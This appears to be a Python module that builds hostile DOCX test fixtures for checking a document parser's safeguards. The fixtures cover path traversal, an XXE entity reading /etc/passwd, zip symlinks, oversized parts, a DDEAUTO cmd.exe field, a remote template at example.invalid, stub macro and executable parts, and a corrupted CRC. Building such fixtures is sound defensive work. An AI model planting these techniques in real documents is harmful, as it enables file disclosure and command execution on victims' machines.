"""Original Elftia deterministic builders for bounded malicious DOCX fixtures."""

from pathlib import Path
import shutil
import stat
import struct
from xml.etree.ElementTree import SubElement, fromstring
import warnings
import zipfile

from document_skills_core.formats.docx.constants import (
    CONTENT_TYPES_NS,
    MAX_XML_BYTES,
    REL_ATTACHED_TEMPLATE,
    REL_HYPERLINK,
    qn,
)
from document_skills_core.formats.docx.xml_utils import xml_bytes

from docx_fixture_support import (
    parts,
    write_entries,
)


def builders() -> dict[str, object]:
    return {
        "docx-malicious-absolute.docx": malicious_absolute,
        "docx-malicious-path.docx": malicious_path,
        "docx-malicious-alias.docx": malicious_alias,
        "docx-malicious-duplicate.docx": malicious_duplicate,
        "docx-malicious-entity.docx": malicious_entity,
        "docx-malicious-xml-limit.docx": malicious_xml_limit,
        "docx-malicious-expansion.docx": malicious_expansion,
        "docx-malicious-symlink.docx": malicious_symlink,
        "docx-malicious-active.docx": malicious_active,
        "docx-malicious-crc.docx": malicious_crc,
    }


def malicious_absolute(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["/absolute.xml"] = b"<absolute/>"
    write_entries(destination, sorted(package_parts.items()))


def malicious_path(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["../escape.xml"] = b"<escape/>"
    write_entries(destination, sorted(package_parts.items()))


def malicious_alias(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["WORD/DOCUMENT.XML"] = package_parts["word/document.xml"]
    write_entries(destination, sorted(package_parts.items()))


def malicious_duplicate(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    entries: list[tuple[str, bytes]] = []
    for name, payload in sorted(package_parts.items()):
        entries.append((name, payload))
        if name == "word/document.xml":
            entries.append((name, payload))
    with warnings.catch_warnings():
        warnings.filterwarnings(
            "ignore",
            message="Duplicate name: 'word/document.xml'",
            category=UserWarning,
        )
        write_entries(destination, entries)


def malicious_entity(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["word/document.xml"] = (
        b'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'
    )
    write_entries(destination, sorted(package_parts.items()))


def malicious_xml_limit(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["word/oversized.xml"] = (
        b"<oversized>" + (b"A" * MAX_XML_BYTES) + b"</oversized>"
    )
    write_entries(destination, sorted(package_parts.items()))


def malicious_expansion(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    package_parts["word/expansion.bin"] = b"A" * (8 * 1024 * 1024)
    write_entries(destination, sorted(package_parts.items()))


def malicious_symlink(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    entries = sorted(
        [*package_parts.items(), ("word/link", b"../../outside")],
        key=lambda item: item[0],
    )
    write_entries(
        destination,
        entries,
        modes={
            "word/link": (stat.S_IFLNK | 0o777) << 16,
        },
    )


def malicious_active(source: Path, destination: Path) -> None:
    package_parts = parts(source)
    relationships = fromstring(package_parts["word/_rels/document.xml.rels"])
    SubElement(
        relationships,
        qn("rels", "Relationship"),
        {
            "Id": "rIdRemoteTemplate",
            "Type": REL_ATTACHED_TEMPLATE,
            "Target": "https://example.invalid/template.dotm",
            "TargetMode": "External",
        },
    )
    SubElement(
        relationships,
        qn("rels", "Relationship"),
        {
            "Id": "rIdExternalLink",
            "Type": REL_HYPERLINK,
            "Target": "https://example.invalid/",
            "TargetMode": "External",
        },
    )
    document = fromstring(package_parts["word/document.xml"])
    body = document.find(qn("w", "body"))
    assert body is not None
    paragraph = SubElement(body, qn("w", "p"))
    run = SubElement(paragraph, qn("w", "r"))
    SubElement(run, qn("w", "instrText")).text = "DDEAUTO cmd.exe"

    content_types = fromstring(package_parts["[Content_Types].xml"])
    overrides = (
        (
            "/word/vbaProject.bin",
            "application/vnd.ms-office.vbaProject",
        ),
        (
            "/word/activeX/activeX1.bin",
            "application/vnd.ms-office.activeX",
        ),
        (
            "/word/embeddings/oleObject1.bin",
            "application/vnd.openxmlformats-officedocument.oleObject",
        ),
    )
    for part_name, content_type in overrides:
        SubElement(
            content_types,
            f"{{{CONTENT_TYPES_NS}}}Override",
            {"PartName": part_name, "ContentType": content_type},
        )

    package_parts["[Content_Types].xml"] = xml_bytes(content_types)
    package_parts["word/_rels/document.xml.rels"] = xml_bytes(relationships)
    package_parts["word/document.xml"] = xml_bytes(document)
    package_parts["word/vbaProject.bin"] = b"VBA"
    package_parts["word/activeX/activeX1.bin"] = b"ACTIVEX"
    package_parts["word/embeddings/oleObject1.bin"] = b"OLE"
    package_parts["word/payload.exe"] = b"MZ\x90\x00ELFTIA"
    write_entries(destination, sorted(package_parts.items()))


def malicious_crc(source: Path, destination: Path) -> None:
    shutil.copyfile(source, destination)
    payload = bytearray(destination.read_bytes())
    with zipfile.ZipFile(destination) as archive:
        entry = archive.getinfo("word/document.xml")
        local_offset = entry.header_offset
    filename_size, extra_size = struct.unpack_from(
        "<HH",
        payload,
        local_offset + 26,
    )
    data_offset = local_offset + 30 + filename_size + extra_size
    payload[data_offset + max(entry.compress_size // 2, 1)] ^= 0x01
    destination.write_bytes(bytes(payload))
